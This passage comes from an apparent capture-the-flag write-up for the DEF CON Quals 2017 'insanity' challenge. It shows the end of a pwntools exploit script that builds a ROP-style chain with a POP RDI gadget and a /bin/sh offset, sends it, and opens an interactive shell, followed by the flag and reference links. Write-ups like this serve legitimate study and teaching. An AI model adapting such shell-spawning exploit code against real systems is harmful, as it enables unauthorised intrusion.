gPOC.append(0)
gPOC.append(offBinsh - offRet + 10)
gPOC.append(2)
gPOC.append(33780 + 10)
gPOC.append(7)

#POP RDI;
gPOC.append(33779 + 10)
gPOC.append(6)
gPOC.append(0)
gPOC.append(offPOPrdi - offRet + 10)
gPOC.append(2)
gPOC.append(33779 + 10)
gPOC.append(7)

gPOC.append(0)

log.info("Fake Code : " + str(gPOC))

for i in gPOC:
    pocCode += p64(i)

pocCode += gAudio[0]

sendMSG(pocCode)

p.send(p32(0))
p.interactive()
```

## **Flag**

|  |  |
| --- | --- |
| Flag | The flag is: It's chickens all the way down |

## **Related Site**

* <https://kitctf.de/writeups/defconquals17/insanity>
* <https://github.com/kitctf/writeups/blob/master/defconquals2017/insanity/pwn.py>
* <http://www.zlib.net/manual.html>
* <https://cmusphinx.github.io/doc/sphinxbase/>
* <http://www.speech.cs.cmu.edu/sphinx/doc/doxygen/pocketsphinx/pocketsphinx_8h.html>
* <https://askubuntu.com/questions/501910/how-to-text-to-speech-output-using-command-line>
* <https://msdn.microsoft.com/en-us/library/t5h7783k(v=vs.90).aspx>
* <https://msdn.microsoft.com/ko-kr/library/xf7k860c(v=vs.100).aspx>
* <https://msdn.microsoft.com/en-us/library/ba08y07y(v=vs.90).aspx>
* <https://msdn.microsoft.com/en-us/library/bb531393(v=vs.120).aspx>
* <https://pypi.python.org/pypi/pocketsphinx>